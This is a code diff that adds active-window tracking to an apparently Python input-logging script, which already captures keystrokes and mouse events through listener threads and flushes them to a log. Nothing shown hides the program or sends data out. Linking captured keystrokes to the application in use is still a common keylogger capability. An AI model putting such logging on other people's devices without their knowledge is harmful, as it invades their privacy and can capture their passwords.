@@ -115,6 +115,15 @@ def periodic_flush():
         time.sleep(10)  # Adjust the interval as needed
         flush_log_buffer()
 
+def log_active_window():
+    global active_window_name
+    while True:
+        time.sleep(5)  # Adjust the interval as needed
+        new_window_name = get_active_window_process_name()
+        if new_window_name != active_window_name:
+            active_window_name = new_window_name
+            log_event(f"Active window: {active_window_name}")
+
 # Set up the keyboard listener
 try:
     keyboard_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
@@ -128,6 +137,7 @@ try:
     mouse_listener.start()
 except Exception as e:
     logging.error(f"Error setting up mouse listener: {e}")
+
 # Set up the key combination listener
 try:
     key_combination_listener = keyboard.Listener(on_press=on_key_combination)
@@ -138,6 +148,10 @@ except Exception as e:
 # Start the periodic flush thread
 flush_thread = threading.Thread(target=periodic_flush, daemon=True)
 flush_thread.start()
+
+# Start the active window logging thread
+active_window_thread = threading.Thread(target=log_active_window, daemon=True)
+active_window_thread.start()
 
 try:
     keyboard_listener.join()
